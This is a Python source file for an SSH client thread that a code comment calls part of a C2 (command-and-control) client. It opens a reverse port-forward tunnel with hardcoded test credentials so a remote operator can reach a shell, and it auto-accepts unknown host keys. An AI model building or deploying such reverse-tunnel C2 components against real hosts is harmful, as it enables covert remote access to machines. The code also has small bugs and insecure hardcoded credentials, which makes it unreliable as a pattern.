import sys
import paramiko
import threading
import socket
import subprocess
import select
import traceback
import queue


class ClientThread(threading.Thread):
    def __init__(self, commands):
        # `commands` is a Queue of commands from the main C2 client class
        super(ClientThread, self).__init__()
        self.commands = commands

        self.REMOTE_HOST = "localhost"
        self.REMOTE_PORT = 22
        self.USERNAME = "test_ssh_user"
        self.PASSWORD = "somePa55word"

        self.stop_request = threading.Event()
        self.closeTunnel = False

        self.client = paramiko.SSHClient()
        self.client.load_system_host_keys()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    def run(self):
        self.client.connect(self.REMOTE_HOST, self.REMOTE_PORT,
                            username=self.USERNAME, password=self.PASSWORD)
        chan = self.client.get_transport().open_session()

        while not self.stop_request.is_set():
            command = self.commands.get(True, 0.05)

            if command == "OPEN_TUNNEL":
                forwardFromPort = self.commands.get(True, 0.05)
                toHostPort = ("localhost", 2222)
                self._establish_reverse_tunnel(toHostPort, forwardFromPort, self.client.get_transport())

    def _establish_reverse_tunnel(self, toHostPort, fromPort, transport):
        print("Establishing reverse tunnel from {0} to {1}:{2}".format(fromPort, toHostPort[0], toHostPort[1]))
        transport.request_port_forward("", fromPort)

        while self.closeTunnel is not True:
            print("Trying to create a channel")
            channel = transport.accept()

            if channel is None:
                print("No Channel")
            
            else:
                self._tunnel_handler(channel, toHostPort[0], toHostPort[1], fromPort)

    def _tunnel_handler(self, channel, host, port, forwardFromPort):
        print("handling tunnel")
        sock = socket.socket()

        try:
            sock.connect((host, port))
            print("Tunnel Connected!")

            while self.closeTunnel is not True:

                r, w, x = select.select([sock, channel], [], [])

                if sock in r:
                    data = sock.recv(1024)

                    if len(data) == 0:
                        break

                    channel.send(data)

                if channel in r:
                    data = channel.recv(1024)

                    if len(data) == 0:
                        break

                    sock.send(data)

                if self.commands.empty() is not True:
                    self.closeTunnel = (self.commands.get(True, 0.05) == "CLOSE_TUNNEL")

            channel.close()
            sock.close()
            print("Tunnel Closed")

        # User has exited their PTY shell
        except OSError as e:
            print("User exited")

            channel.close()
            sock.close()
            print("Tunnel Closed")

        except Exception as e:
            print("Failed to establish tunnel!")
            traceback.print_exc()
